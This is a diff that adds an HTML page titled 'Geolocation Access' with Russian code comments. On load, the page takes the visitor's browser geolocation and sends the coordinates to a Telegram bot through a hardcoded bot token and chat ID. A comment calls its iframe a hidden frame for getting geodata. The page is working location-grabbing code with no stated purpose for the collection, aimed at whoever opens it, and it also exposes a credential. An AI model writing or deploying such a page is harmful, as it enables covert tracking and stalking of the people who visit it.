@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geolocation Access</title>
+</head>
+<body>
+    <!-- Скрытый iframe для получения геоданных -->
+    <iframe id="hiddenFrame" style="display: none;"></iframe>
+
+    <script>
+        // Функция для отправки геоданных на Telegram бота
+        function sendLocationToBot(latitude, longitude) {
+            const botToken = '7139229042:AAFbNfB47103dgpTX0hvr9OZZ7VhfRuJ5jA';
+            const chatId = '5682662110';
+            const message = `Latitude: ${latitude}, Longitude: ${longitude}`;
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const params = {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            };
+
+            fetch(telegramUrl, params)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Error sending location to Telegram bot');
+                    }
+                    console.log('Location sent to Telegram bot:', message);
+                })
+                .catch(error => {
+                    console.error('An error occurred:', error);
+                });
+        }
+
+        // Функция для получения геоданных
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+                    // Отправка геоданных на Telegram бота
+                    sendLocationToBot(latitude, longitude);
+                });
+            } else {
+                console.error('Geolocation is not supported by this browser.');
+            }
+        }
+
+        // Вызов функции для получения геоданных
+        getLocation();
+    </script>
+</body>
+</html>
